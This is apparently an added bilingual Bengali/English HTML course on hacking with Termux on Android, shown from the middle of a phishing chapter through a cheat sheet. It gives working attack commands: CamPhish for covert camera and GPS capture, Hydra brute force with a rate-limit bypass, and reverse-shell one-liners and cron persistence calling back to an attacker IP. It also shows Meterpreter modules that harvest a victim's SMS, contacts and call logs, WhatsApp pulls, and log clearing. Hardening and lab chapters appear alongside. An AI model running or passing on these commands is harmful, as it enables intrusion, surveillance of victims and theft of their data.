+<span class="g">[*] Victim IP: 192.168.1.100
+[*] Username: victim@email.com
+[*] Password: password123</span>
+    </div>
+
+    <h2 class="sec">📱 Camphish — <span class="bn-text">Camera দিয়ে Location নেওয়া</span><span class="en-text">Getting Location via Camera</span></h2>
+    <div class="code">
+<span class="c"># CamPhish install</span>
+git clone https://github.com/techchipnet/CamPhish.git
+cd CamPhish && bash camphish.sh
+
+<span class="c"># কীভাবে কাজ করে:</span>
+<span class="c"># 1. একটি fake webpage তৈরি হয়</span>
+<span class="c"># 2. Victim-কে link পাঠানো হয়</span>
+<span class="c"># 3. Page খুললে Camera permission চাওয়া হয়</span>
+<span class="c"># 4. Permission দিলে photo তোলা হয় ও GPS location পাওয়া যায়</span>
+    </div>
+
+    <h2 class="sec">📧 <span class="bn-text">Phishing থেকে বাঁচার উপায়</span><span class="en-text">How to Stay Safe from Phishing</span></h2>
+    <div class="grid2">
+      <div class="card danger-card">
+        <h4>🚨 <span class="bn-text">Phishing চেনার উপায়</span><span class="en-text">How to Identify Phishing</span></h4>
+        <ul>
+          <li><span class="bn-text">URL টা সঠিক কিনা দেখো (facebook.com vs faceb00k.com)</span><span class="en-text">Check if URL is correct (facebook.com vs faceb00k.com)</span></li>
+          <li><span class="bn-text">HTTPS আছে কিনা দেখো</span><span class="en-text">Check if HTTPS is present</span></li>
+          <li><span class="bn-text">Unexpected login page সন্দেহজনক</span><span class="en-text">Unexpected login pages are suspicious</span></li>
+        </ul>
+      </div>
+      <div class="card success-card">
+        <h4>🛡️ <span class="bn-text">নিরাপদ থাকার উপায়</span><span class="en-text">Ways to Stay Safe</span></h4>
+        <ul>
+          <li>2FA/MFA <span class="bn-text">চালু রাখো</span><span class="en-text">Enable 2FA/MFA</span></li>
+          <li>Password Manager <span class="bn-text">ব্যবহার করো</span><span class="en-text">Use a password manager</span></li>
+          <li><span class="bn-text">Unknown link-এ click করো না</span><span class="en-text">Don't click unknown links</span></li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>🎣 <span class="bn-text">Chapter সারসংক্ষেপ</span><span class="en-text">Chapter Summary</span></h3>
+      <ul>
+        <li>🔗 <span class="bn-text">ngrok/cloudflared = Local server-কে Public URL দেওয়া</span><span class="en-text">ngrok/cloudflared = give local server a public URL</span></li>
+        <li>🎣 <span class="bn-text">zphisher = Ready-made Phishing Pages</span><span class="en-text">zphisher = ready-made phishing pages</span></li>
+        <li>🛡️ <span class="bn-text">2FA + URL check = Phishing থেকে সুরক্ষা</span><span class="en-text">2FA + URL check = protection from phishing</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ CHAPTER 9 ═══ -->
+<div class="chapter ch9">
+  <div class="chapter-header">
+    <div class="chapter-label">Chapter 09</div>
+    <div class="chapter-title">🕵️ OSINT — <span class="bn-text">তথ্য সংগ্রহ</span><span class="en-text">Information Gathering</span></div>
+    <div class="chapter-desc"><span class="bn-text">Termux দিয়ে Phone, Email, Username ও Social Media OSINT</span><span class="en-text">Phone, Email, Username, and Social Media OSINT with Termux</span></div>
+  </div>
+  <div class="chapter-body">
+    <h2 class="sec">🔍 Username OSINT — Sherlock</h2>
+    <div class="code">
+<span class="c"># Sherlock — Username একসাথে 400+ সাইটে খোঁজো</span>
+git clone https://github.com/sherlock-project/sherlock.git
+cd sherlock && pip install -r requirements.txt
+
+<span class="c"># Username search</span>
+python3 sherlock username123
+
+<span class="c"># Multiple usernames</span>
+python3 sherlock user1 user2 user3
+
+<span class="c"># Output:</span>
+<span class="g">[+] Twitter:     https://twitter.com/username123
+[+] Instagram:   https://instagram.com/username123
+[+] GitHub:      https://github.com/username123
+[+] Reddit:      https://reddit.com/user/username123
+[-] Facebook:    Not Found</span>
+    </div>
+
+    <h2 class="sec">📧 Email OSINT — holehe</h2>
+    <div class="code">
+<span class="c"># holehe — Email কোন কোন সাইটে Registered</span>
+pip install holehe
+holehe target@email.com
+
+<span class="c"># Output:</span>
+<span class="g">[+] google.com       - Email used
+[+] facebook.com     - Email used
+[+] twitter.com      - Email used
+[-] github.com       - Email not used
+[+] instagram.com    - Email used</span>
+
+<span class="c"># theHarvester — Email, Domain OSINT</span>
+pip install theHarvester
+theHarvester -d target.com -b google,bing,linkedin
+    </div>
+
+    <h2 class="sec">📱 Phone Number OSINT</h2>
+    <div class="code">
+<span class="c"># phoneinfoga — Phone number OSINT</span>
+pkg install golang
+go install github.com/sundowndev/phoneinfoga/v2/cmd/phoneinfoga@latest
+
+phoneinfoga scan -n "+8801XXXXXXXXX"
+
+<span class="c"># Output:</span>
+<span class="g">Number:       +8801XXXXXXXXX
+Country:      Bangladesh
+Carrier:      Grameenphone
+Line Type:    Mobile
+Valid:        true</span>
+
+<span class="c"># OsintFramework-এর Phone lookup:</span>
+<span class="c"># truecaller.com, sync.me, whitepages.com</span>
+    </div>
+
+    <h2 class="sec">🌐 Website/Domain OSINT</h2>
+    <div class="code">
+<span class="c"># WHOIS lookup</span>
+whois target.com
+
+<span class="c"># DNS records</span>
+nslookup target.com
+dig target.com ANY
+dig target.com MX      <span class="c"># Mail servers</span>
+dig target.com TXT     <span class="c"># TXT records (often has juicy info)</span>
+
+<span class="c"># Reverse IP (other sites on same server)</span>
+curl "https://api.hackertarget.com/reverseiplookup/?q=IP_HERE"
+
+<span class="c"># Shodan (Internet-connected device search)</span>
+pip install shodan
+shodan init YOUR_API_KEY
+shodan host IP_ADDRESS
+shodan search "target.com"
+
+<span class="c"># Wayback Machine (old versions of website)</span>
+curl "http://archive.org/wayback/available?url=target.com"
+    </div>
+
+    <div class="chapter-summary">
+      <h3>🕵️ <span class="bn-text">Chapter সারসংক্ষেপ</span><span class="en-text">Chapter Summary</span></h3>
+      <ul>
+        <li>👤 <span class="bn-text">Sherlock = Username 400+ সাইটে একসাথে খোঁজো</span><span class="en-text">Sherlock = search username on 400+ sites at once</span></li>
+        <li>📧 <span class="bn-text">holehe = Email কোন কোন সাইটে আছে জানো</span><span class="en-text">holehe = find which sites use an email</span></li>
+        <li>🌐 <span class="bn-text">Shodan = Internet-এর Google for Hackers</span><span class="en-text">Shodan = internet's Google for hackers</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ CHAPTER 10 ═══ -->
+<div class="chapter ch10">
+  <div class="chapter-header">
+    <div class="chapter-label">Chapter 10</div>
+    <div class="chapter-title">🔑 Password Attacks</div>
+    <div class="chapter-desc"><span class="bn-text">Brute Force, Dictionary Attack, Hash Cracking — Termux দিয়ে</span><span class="en-text">Brute Force, Dictionary Attack, Hash Cracking — with Termux</span></div>
+  </div>
+  <div class="chapter-body">
+    <h2 class="sec">📚 <span class="bn-text">Wordlist তৈরি করা</span><span class="en-text">Creating Wordlists</span></h2>
+    <div class="code">
+<span class="c"># rockyou.txt (সবচেয়ে popular wordlist)</span>
+<span class="c"># Kali-তে already থাকে</span>
+ls /usr/share/wordlists/
+gunzip /usr/share/wordlists/rockyou.txt.gz
+
+<span class="c"># cupp — Custom wordlist (target-এর info দিয়ে)</span>
+pip install cupp
+cupp -i
+<span class="c"># Name, Birthday, Partner, Pet name input দাও</span>
+<span class="c"># Output: custom_wordlist.txt (thousands of variations)</span>
+
+<span class="c"># crunch — Pattern-based wordlist</span>
+pkg install crunch
+crunch 8 8 0123456789 -o numeric_8.txt   <span class="c"># 8-digit numbers only</span>
+crunch 6 10 abcdefgh -o alpha.txt        <span class="c"># 6-10 char alphabet</span>
+
+<span class="c"># CeWL — Website থেকে wordlist তৈরি</span>
+gem install cewl
+cewl https://target.com -d 2 -m 5 -w wordlist.txt
+    </div>
+
+    <h2 class="sec">💥 Hydra — Network Brute Force</h2>
+    <div class="code">
+<span class="c"># SSH Brute Force</span>
+hydra -l admin -P rockyou.txt ssh://192.168.1.100
+hydra -L users.txt -P passwords.txt ssh://192.168.1.100
+
+<span class="c"># FTP Brute Force</span>
+hydra -l admin -P passwords.txt ftp://192.168.1.100
+
+<span class="c"># HTTP Login Form</span>
+hydra -l admin -P rockyou.txt 192.168.1.100 \
+  http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
+
+<span class="c"># WordPress Login</span>
+hydra -l admin -P rockyou.txt \
+  192.168.1.100 http-post-form \
+  "/wp-login.php:log=^USER^&pwd=^PASS^:incorrect"
+
+<span class="c"># MySQL</span>
+hydra -l root -P passwords.txt 192.168.1.100 mysql
+
+<span class="c"># Speed control (Rate limiting bypass)</span>
+hydra -l admin -P rockyou.txt -t 4 -W 2 ssh://192.168.1.100
+<span class="c"># -t = threads, -W = wait seconds</span>
+    </div>
+
+    <h2 class="sec">🔓 Hash Cracking — hashcat ও john</h2>
+    <div class="code">
+<span class="c"># Hash type identify করো</span>
+hash-identifier  "5f4dcc3b5aa765d61d8327deb882cf99"
+
+<span class="c"># john the ripper</span>
+pkg install john
+
+john --wordlist=rockyou.txt hashes.txt         <span class="c"># Dictionary attack</span>
+john --format=md5 --wordlist=rockyou.txt hash.txt
+john --show hashes.txt                          <span class="c"># Cracked passwords দেখো</span>
+
+<span class="c"># hashcat (GPU — Desktop-এ বেশি কাজের)</span>
+hashcat -m 0 hash.txt rockyou.txt              <span class="c"># MD5</span>
+hashcat -m 1000 hash.txt rockyou.txt           <span class="c"># NTLM (Windows)</span>
+hashcat -m 1800 hash.txt rockyou.txt           <span class="c"># SHA-512 (Linux)</span>
+hashcat -m 3200 hash.txt rockyou.txt           <span class="c"># bcrypt</span>
+hashcat -m 22000 hash.hc22000 rockyou.txt      <span class="c"># WPA2</span>
+
+<span class="c"># Hash Type Reference:</span>
+<span class="y">MD5     = -m 0    → 5f4dcc3b5aa765d61d8327deb882cf99
+SHA1    = -m 100  → 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8
+SHA256  = -m 1400
+bcrypt  = -m 3200 → $2y$10$...</span>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>🔑 <span class="bn-text">Chapter সারসংক্ষেপ</span><span class="en-text">Chapter Summary</span></h3>
+      <ul>
+        <li>📚 <span class="bn-text">cupp দিয়ে target-এর info থেকে custom wordlist</span><span class="en-text">Create custom wordlists from target info using cupp</span></li>
+        <li>💥 <span class="bn-text">Hydra = SSH, FTP, HTTP সব service-এ brute force</span><span class="en-text">Hydra = brute force SSH, FTP, HTTP and all services</span></li>
+        <li>🔓 <span class="bn-text">hashcat + rockyou = MD5 password 5 মিনিটে crack</span><span class="en-text">hashcat + rockyou = crack MD5 passwords in 5 minutes</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ CHAPTER 11 ═══ -->
+<div class="chapter ch11">
+  <div class="chapter-header">
+    <div class="chapter-label">Chapter 11</div>
+    <div class="chapter-title">🎭 Post Exploitation — <span class="bn-text">Access পাওয়ার পরে</span><span class="en-text">After Getting Access</span></div>
+    <div class="chapter-desc"><span class="bn-text">System-এ ঢোকার পরে কী করে Privilege বাড়ানো যায়, কীভাবে Persistence রাখা যায়</span><span class="en-text">After entering a system — how to escalate privileges and maintain persistence</span></div>
+  </div>
+  <div class="chapter-body">
+    <h2 class="sec">⬆️ Privilege Escalation — Android</h2>
+    <div class="code">
+<span class="c"># System info gather করো</span>
+adb shell getprop ro.build.version.release   <span class="c"># Android version</span>
+adb shell getprop ro.build.fingerprint       <span class="c"># Build info</span>
+adb shell cat /proc/version                  <span class="c"># Kernel version</span>
+
+<span class="c"># CVE check — known kernel exploits</span>
+<span class="c"># Android 9 = Kernel 4.x → search for privilege escalation CVEs</span>
+
+<span class="c"># SUID binaries খোঁজো</span>
+adb shell find / -perm -4000 2>/dev/null
+
+<span class="c"># Writable directories</span>
+adb shell find / -writable -type d 2>/dev/null | head -20
+
+<span class="c"># Running services</span>
+adb shell ps -A | grep -v "kthre\|kwork"
+    </div>
+
+    <h2 class="sec">🔁 Persistence — <span class="bn-text">Access ধরে রাখা</span><span class="en-text">Maintaining Access</span></h2>
+    <div class="code">
+<span class="c"># Meterpreter persistence module</span>
+meterpreter > run persistence -A -S -U -X -i 30 -p 4444 -r 192.168.1.X
+<span class="c"># -A = autostart msfconsole
+# -S = run as service
+# -X = start on boot
+# -i = interval (seconds)</span>
+
+<span class="c"># Cronjob persistence (Linux server)</span>
+crontab -e
+<span class="c"># Add: */5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.X/4444 0>&1'</span>
+
+<span class="c"># Reverse Shell one-liners</span>
+<span class="c"># Bash</span>
+bash -i >& /dev/tcp/192.168.1.X/4444 0>&1
+
+<span class="c"># Python</span>
+python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.1.X",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+
+<span class="c"># Netcat</span>
+nc -e /bin/bash 192.168.1.X 4444
+    </div>
+
+    <h2 class="sec">📦 Data Exfiltration</h2>
+    <div class="code">
+<span class="c"># Meterpreter — Data collection</span>
+meterpreter > run post/multi/recon/local_exploit_suggester
+meterpreter > run post/android/gather/contacts
+meterpreter > run post/android/gather/call_logs
+meterpreter > run post/android/gather/sms
+meterpreter > run post/android/gather/get_user_files
+
+<span class="c"># ADB-এ সব photos নিয়ে আসো</span>
+adb pull /sdcard/DCIM/ ./photos/
+adb pull /sdcard/WhatsApp/ ./whatsapp_backup/
+
+<span class="c"># Tracks মুছে ফেলো</span>
+meterpreter > clearev               <span class="c"># Event logs clear</span>
+adb shell logcat -c                 <span class="c"># System logs clear</span>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>🎭 <span class="bn-text">Chapter সারসংক্ষেপ</span><span class="en-text">Chapter Summary</span></h3>
+      <ul>
+        <li>⬆️ <span class="bn-text">Privilege Escalation = System-এ আরও বেশি Control</span><span class="en-text">Privilege Escalation = more control over the system</span></li>
+        <li>🔁 <span class="bn-text">Persistence = Device restart-এর পরেও Connection রাখা</span><span class="en-text">Persistence = maintain connection after device restart</span></li>
+        <li>🧹 <span class="bn-text">Tracks মুছে ফেলা Professional Pentest-এর অংশ</span><span class="en-text">Clearing tracks is part of professional pentesting</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ CHAPTER 12 ═══ -->
+<div class="chapter ch12">
+  <div class="chapter-header">
+    <div class="chapter-label">Chapter 12</div>
+    <div class="chapter-title">🛡️ <span class="bn-text">Android Security Hardening</span><span class="en-text">Android Security Hardening</span></div>
+    <div class="chapter-desc"><span class="bn-text">নিজের Android Device ও Termux-কে Secure করার সম্পূর্ণ গাইড</span><span class="en-text">Complete guide to securing your Android device and Termux</span></div>
+  </div>
+  <div class="chapter-body">
+    <h2 class="sec">📱 <span class="bn-text">Android Device Hardening</span><span class="en-text">Android Device Hardening</span></h2>
+    <div class="grid2">
+      <div class="card success-card">
+        <h4>✅ <span class="bn-text">করো</span><span class="en-text">Do This</span></h4>
+        <ul>
+          <li><span class="bn-text">💡 OS সবসময় আপডেট রাখো</span><span class="en-text">Always keep OS updated</span></li>
+          <li><span class="bn-text">🔐 Strong PIN/Password (6+ digit)</span><span class="en-text">Strong PIN/Password (6+ digit)</span></li>
+          <li><span class="bn-text">🔒 Full Disk Encryption চালু করো</span><span class="en-text">Enable Full Disk Encryption</span></li>
+          <li><span class="bn-text">📲 Only Play Store থেকে App install</span><span class="en-text">Install apps only from Play Store</span></li>
+          <li><span class="bn-text">🌐 VPN ব্যবহার করো (Public WiFi-তে)</span><span class="en-text">Use VPN (on public WiFi)</span></li>
+          <li><span class="bn-text">🔑 2FA সব Account-এ চালু করো</span><span class="en-text">Enable 2FA on all accounts</span></li>
+          <li><span class="bn-text">🧹 Unused Apps মুছে ফেলো</span><span class="en-text">Delete unused apps</span></li>
+        </ul>
+      </div>
+      <div class="card danger-card">
+        <h4>❌ <span class="bn-text">করো না</span><span class="en-text">Don't Do This</span></h4>
+        <ul>
+          <li><span class="bn-text">Unknown APK install করা</span><span class="en-text">Install unknown APKs</span></li>
+          <li><span class="bn-text">Public WiFi-তে Banking করা</span><span class="en-text">Do banking on public WiFi</span></li>
+          <li><span class="bn-text">SMS-এ আসা link-এ click করা</span><span class="en-text">Click links in SMS</span></li>
+          <li>Unnecessary permissions দেওয়া</li>
+          <li>USB Debugging চালু রাখা</li>
+          <li>Developer Options খোলা রাখা</li>
+          <li><span class="bn-text">Root করলে SELinux বন্ধ করা</span><span class="en-text">Turning off SELinux after rooting</span></li>
+        </ul>
+      </div>
+    </div>
+
+    <h2 class="sec">🔒 Termux Security</h2>
+    <div class="code">
+<span class="c"># SSH key তৈরি করো (Password-এর বদলে)</span>
+ssh-keygen -t ed25519 -C "termux@android"
+cat ~/.ssh/id_ed25519.pub
+
+<span class="c"># Termux SSH Server চালু করো (Password-less)</span>
+pkg install openssh
+sshd                         <span class="c"># SSH server start</span>
+<span class="c"># Port: 8022 (না 22)</span>
+
+<span class="c"># File Encryption</span>
+pkg install gnupg
+gpg --symmetric secret_file.txt          <span class="c"># Encrypt</span>
+gpg --decrypt secret_file.txt.gpg        <span class="c"># Decrypt</span>
+
+<span class="c"># Network Monitoring — কে কথা বলছে?</span>
+netstat -an | grep ESTABLISHED
+ss -tp
+
+<span class="c"># Firewall rules (root required)</span>
+iptables -L                 <span class="c"># Current rules</span>
+iptables -A INPUT -p tcp --dport 8022 -j ACCEPT   <span class="c"># Allow SSH</span>
+iptables -A INPUT -j DROP                          <span class="c"># Block rest</span>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>🛡️ <span class="bn-text">Chapter সারসংক্ষেপ</span><span class="en-text">Chapter Summary</span></h3>
+      <ul>
+        <li>🔒 <span class="bn-text">Encryption + 2FA + Strong Password = Basic Security</span><span class="en-text">Encryption + 2FA + Strong Password = Basic Security</span></li>
+        <li>📲 <span class="bn-text">Unknown APK install করো না — সবচেয়ে বড় Risk</span><span class="en-text">Don't install unknown APKs — biggest risk</span></li>
+        <li>🌐 <span class="bn-text">Public WiFi-তে VPN ছাড়া কাজ করো না</span><span class="en-text">Never work on public WiFi without VPN</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ CHAPTER 13 ═══ -->
+<div class="chapter ch13">
+  <div class="chapter-header">
+    <div class="chapter-label">Chapter 13</div>
+    <div class="chapter-title">🏆 CTF Practice ও Lab Setup</div>
+    <div class="chapter-desc"><span class="bn-text">Vulnerable Apps দিয়ে Safe Practice — Android Security Testing Lab</span><span class="en-text">Safe practice with vulnerable apps — Android security testing lab</span></div>
+  </div>
+  <div class="chapter-body">
+    <h2 class="sec">📱 <span class="bn-text">Vulnerable Android Apps — Practice Target</span><span class="en-text">Vulnerable Android Apps — Practice Targets</span></h2>
+    <table>
+      <thead><tr><th>App</th><th><span class="bn-text">কী শেখা যায়</span><span class="en-text">What You Learn</span></th><th>Download</th><th>Level</th></tr></thead>
+      <tbody>
+        <tr><td><strong>DIVA</strong></td><td><span class="bn-text">Android vuln সব ধরন</span><span class="en-text">All types of Android vulns</span></td><td>GitHub</td><td><span class="badge badge-g">Beginner</span></td></tr>
+        <tr><td><strong>InsecureBankv2</strong></td><td><span class="bn-text">Banking app vulnerabilities</span><span class="en-text">Banking app vulnerabilities</span></td><td>GitHub</td><td><span class="badge badge-y">Medium</span></td></tr>
+        <tr><td><strong>AndroGoat</strong></td><td>OWASP Mobile Top 10</td><td>GitHub</td><td><span class="badge badge-y">Medium</span></td></tr>
+        <tr><td><strong>MSTG Crackmes</strong></td><td><span class="bn-text">Reverse Engineering</span><span class="en-text">Reverse Engineering</span></td><td>GitHub</td><td><span class="badge badge-r">Hard</span></td></tr>
+        <tr><td><strong>HackTheBox Android</strong></td><td>Real CTF challenges</td><td>htb.com</td><td><span class="badge badge-r">Hard</span></td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec">🧪 DIVA — <span class="bn-text">সবার আগে এটা দিয়ে শুরু করো</span><span class="en-text">Start Here First</span></h2>
+    <div class="code">
+<span class="c"># DIVA (Damn Insecure and Vulnerable App) download</span>
+wget https://github.com/0xArab/diva-apk-file/raw/master/DivaApplication.apk
+
+<span class="c"># নিজের Phone-এ install করো</span>
+adb install DivaApplication.apk
+
+<span class="c"># DIVA-র 13টি Challenge:</span>
+<span class="y">01. Insecure Logging
+02. Hardcoded Issues
+03. Insecure Data Storage (SharedPreferences)
+04. Insecure Data Storage (SQLite)
+05. Insecure Data Storage (Temp Files)
+06. Insecure Data Storage (External Storage)
+07. Input Validation Issues (SQLi)
+08. Input Validation Issues (XSS)
+09. Access Control Issues
+10. Insecure Data Storage (3rd Party Libs)
+11. Input Validation Issues (BufferOverflow)
+12. Hardcoded Issues (Part 2)
+13. Input Validation Issues (SQL Injection — Part 2)</span>
+
+<span class="c"># Challenge 3 — SharedPreferences solve করা:</span>
+adb shell cat /data/data/jakhar.aseem.diva/shared_prefs/*.xml
+    </div>
+
+    <h2 class="sec">🌐 Online Practice Platforms</h2>
+    <div class="grid3">
+      <div class="card teal-card">
+        <h4>HackTheBox</h4>
+        <ul>
+          <li>Android CTF machines</li>
+          <li>APK challenges</li>
+          <li>Real-world scenarios</li>
+          <li>Free tier available</li>
+        </ul>
+      </div>
+      <div class="card">
+        <h4>TryHackMe</h4>
+        <ul>
+          <li>Guided Android rooms</li>
+          <li>Step-by-step learning</li>
+          <li>Beginner friendly</li>
+          <li>Free + Premium</li>
+        </ul>
+      </div>
+      <div class="card success-card">
+        <h4>PortSwigger</h4>
+        <ul>
+          <li>Mobile web testing</li>
+          <li>API testing</li>
+          <li>100% Free</li>
+          <li>Best for beginners</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>🏆 <span class="bn-text">Chapter সারসংক্ষেপ</span><span class="en-text">Chapter Summary</span></h3>
+      <ul>
+        <li>📱 <span class="bn-text">DIVA দিয়ে শুরু করো — 13টি Challenge, সব কিছু আছে</span><span class="en-text">Start with DIVA — 13 challenges covering everything</span></li>
+        <li>🏆 <span class="bn-text">HackTheBox = Real-world Android Hacking Practice</span><span class="en-text">HackTheBox = real-world Android hacking practice</span></li>
+        <li>🌐 <span class="bn-text">TryHackMe = Guided Learning, Beginner-দের জন্য সেরা</span><span class="en-text">TryHackMe = guided learning, best for beginners</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ CHAPTER 14 ═══ -->
+<div class="chapter ch14">
+  <div class="chapter-header">
+    <div class="chapter-label">Chapter 14</div>
+    <div class="chapter-title">📚 Career Path, Resources ও Cheat Sheet</div>
+    <div class="chapter-desc"><span class="bn-text">সম্পূর্ণ Termux Cheat Sheet, Career Guide এবং সেরা Resources</span><span class="en-text">Complete Termux Cheat Sheet, Career Guide, and best resources</span></div>
+  </div>
+  <div class="chapter-body">
+    <h2 class="sec">🗺️ Career Path — Android Security</h2>
+    <div class="roadmap-container">
+      <div class="roadmap-phase">
+        <div class="phase-number" style="background:#2dc653;">1</div>
+        <div class="phase-content">
+          <div class="phase-title">Month 1–2: Foundation</div>
+          <div class="phase-desc"><span class="bn-text">Termux setup, ADB, Android Architecture, DIVA practice</span><span class="en-text">Termux setup, ADB, Android architecture, DIVA practice</span></div>
+          <div class="phase-items">
+            <span class="phase-item" style="color:#2dc653;">Termux</span>
+            <span class="phase-item" style="color:#2dc653;">ADB</span>
+            <span class="phase-item" style="color:#2dc653;">DIVA</span>
+          </div>
+        </div>
+      </div>
+      <div class="roadmap-arrow">⬇</div>
+      <div class="roadmap-phase">
+        <div class="phase-number" style="background:#0077b6;">2</div>
+        <div class="phase-content">
+          <div class="phase-title">Month 3–4: Tools</div>
+          <div class="phase-desc"><span class="bn-text">Metasploit, APK Analysis, Network Attacks, Hydra</span><span class="en-text">Metasploit, APK Analysis, Network Attacks, Hydra</span></div>
+          <div class="phase-items">
+            <span class="phase-item" style="color:#0077b6;">Metasploit</span>
+            <span class="phase-item" style="color:#0077b6;">apktool</span>
+            <span class="phase-item" style="color:#0077b6;">MITM</span>
+          </div>
+        </div>
+      </div>
+      <div class="roadmap-arrow">⬇</div>
+      <div class="roadmap-phase">
+        <div class="phase-number" style="background:#ffd60a; color:#0d1b2a;">3</div>
+        <div class="phase-content">
+          <div class="phase-title">Month 5–6: CTF</div>
+          <div class="phase-desc"><span class="bn-text">HackTheBox, TryHackMe Android challenges</span><span class="en-text">HackTheBox, TryHackMe Android challenges</span></div>
+          <div class="phase-items">
+            <span class="phase-item" style="color:#856404;">HackTheBox</span>
+            <span class="phase-item" style="color:#856404;">TryHackMe</span>
+            <span class="phase-item" style="color:#856404;">CTF</span>
+          </div>
+        </div>
+      </div>
+      <div class="roadmap-arrow">⬇</div>
+      <div class="roadmap-phase">
+        <div class="phase-number" style="background:#e63946;">4</div>
+        <div class="phase-content">
+          <div class="phase-title">Month 7+: Bug Bounty</div>
+          <div class="phase-desc"><span class="bn-text">HackerOne/Bugcrowd-এ Android App Bug Bounty শুরু করো</span><span class="en-text">Start Android App Bug Bounty on HackerOne/Bugcrowd</span></div>
+          <div class="phase-items">
+            <span class="phase-item" style="color:#c1121f;">Bug Bounty</span>
+            <span class="phase-item" style="color:#c1121f;">Android Pentest</span>
+            <span class="phase-item" style="color:#c1121f;">💰 Earning</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <h2 class="sec">📋 <span class="bn-text">সম্পূর্ণ Termux Cheat Sheet</span><span class="en-text">Complete Termux Cheat Sheet</span></h2>
+    <div class="cheat-grid">
+      <div class="cheat-card">
+        <div class="cheat-card-header" style="background:#2dc653; color:#0d1b2a;">📦 Termux Basics</div>
+        <div class="cheat-card-body">
+          <div class="cheat-row"><div class="cheat-cmd">pkg update && pkg upgrade</div><div class="cheat-desc">System update</div></div>
+          <div class="cheat-row"><div class="cheat-cmd">pkg install [tool]</div><div class="cheat-desc">Tool install</div></div>
+          <div class="cheat-row"><div class="cheat-cmd">termux-setup-storage</div><div class="cheat-desc">Storage access</div></div>
+          <div class="cheat-row"><div class="cheat-cmd">proot-distro login kali</div><div class="cheat-desc">Enter Kali Linux</div></div>
+          <div class="cheat-row"><div class="cheat-cmd">termux-wake-lock</div><div class="cheat-desc">Keep screen alive</div></div>
+        </div>
+      </div>
+      <div class="cheat-card">
+        <div class="cheat-card-header" style="background:#0077b6;">🗺️ Network Recon</div>
+        <div class="cheat-card-body">
+          <div class="cheat-row"><div class="cheat-cmd">nmap -sn 192.168.1.0/24</div><div class="cheat-desc">Host discovery</div></div>
+          <div class="cheat-row"><div class="cheat-cmd">nmap -sV -sC [IP]</div><div class="cheat-desc">Service scan</div></div>
+          <div class="cheat-row"><div class="cheat-cmd">netdiscover -r [range]</div><div class="cheat-desc">ARP scan</div></div>
+          <div class="cheat-row"><div class="cheat-cmd">tcpdump -i wlan0 -w cap.pcap</div><div class="cheat-desc">Packet capture</div></div>
+          <div class="cheat-row"><div class="cheat-cmd">whois [domain]</div><div class="cheat-desc">Domain info</div></div>
+        </div>
+      </div>
+      <div class="cheat-card">
+        <div class="cheat-card-header" style="background:#7b2d8b;">📲 APK Analysis</div>
+        <div class="cheat-card-body">
+          <div class="cheat-row"><div class="cheat-cmd">apktool d app.apk -o out/</div><div class="cheat-desc">Decompile APK</div></div>
+          <div class="cheat-row"><div class="cheat-cmd">jadx -d out/ app.apk</div><div class="cheat-desc">Java decompile</div></div>
+          <div class="cheat-row"><div class="cheat-cmd">apktool b out/ -o new.apk</div><div class="cheat-desc">Recompile APK</div></div>
+          <div class="cheat-row"><div class="cheat-cmd">grep -ri "api_key" out/</div><div class="cheat-desc">Find secrets</div></div>
+          <div class="cheat-row"><div class="cheat-cmd">adb install app.apk</div><div class="cheat-desc">Install APK</div></div>
+        </div>
+      </div>
+      <div class="cheat-card">
+        <div class="cheat-card-header" style="background:#e63946;">💣 Exploitation</div>
+        <div class="cheat-card-body">
+          <div class="cheat-row"><div class="cheat-cmd">msfvenom -p android/... LHOST=X LPORT=4444 -o a.apk</div><div class="cheat-desc">Android payload</div></div>
+          <div class="cheat-row"><div class="cheat-cmd">msfconsole -q</div><div class="cheat-desc">Start Metasploit</div></div>
+          <div class="cheat-row"><div class="cheat-cmd">use exploit/multi/handler</div><div class="cheat-desc">Start listener</div></div>
+          <div class="cheat-row"><div class="cheat-cmd">sessions -l</div><div class="cheat-desc">List sessions</div></div>
+          <div class="cheat-row"><div class="cheat-cmd">sessions -i 1</div><div class="cheat-desc">Enter session</div></div>
+        </div>
+      </div>
+      <div class="cheat-card">
+        <div class="cheat-card-header" style="background:#f4831f;">🔑 Password Attack</div>
+        <div class="cheat-card-body">
+          <div class="cheat-row"><div class="cheat-cmd">hydra -l admin -P rockyou.txt ssh://[IP]</div><div class="cheat-desc">SSH brute</div></div>
+          <div class="cheat-row"><div class="cheat-cmd">hashcat -m 0 hash.txt wordlist.txt</div><div class="cheat-desc">MD5 crack</div></div>
+          <div class="cheat-row"><div class="cheat-cmd">john --wordlist=list.txt hash.txt</div><div class="cheat-desc">John crack</div></div>
+          <div class="cheat-row"><div class="cheat-cmd">cupp -i</div><div class="cheat-desc">Custom wordlist</div></div>
+          <div class="cheat-row"><div class="cheat-cmd">crunch 8 8 0-9 -o nums.txt</div><div class="cheat-desc">Generate wordlist</div></div>
+        </div>
+      </div>
+      <div class="cheat-card">
+        <div class="cheat-card-header" style="background:#00b4d8;">🕵️ OSINT</div>
+        <div class="cheat-card-body">
+          <div class="cheat-row"><div class="cheat-cmd">python3 sherlock [username]</div><div class="cheat-desc">Username search</div></div>
+          <div class="cheat-row"><div class="cheat-cmd">holehe [email]</div><div class="cheat-desc">Email OSINT</div></div>
+          <div class="cheat-row"><div class="cheat-cmd">phoneinfoga scan -n "+880..."</div><div class="cheat-desc">Phone OSINT</div></div>
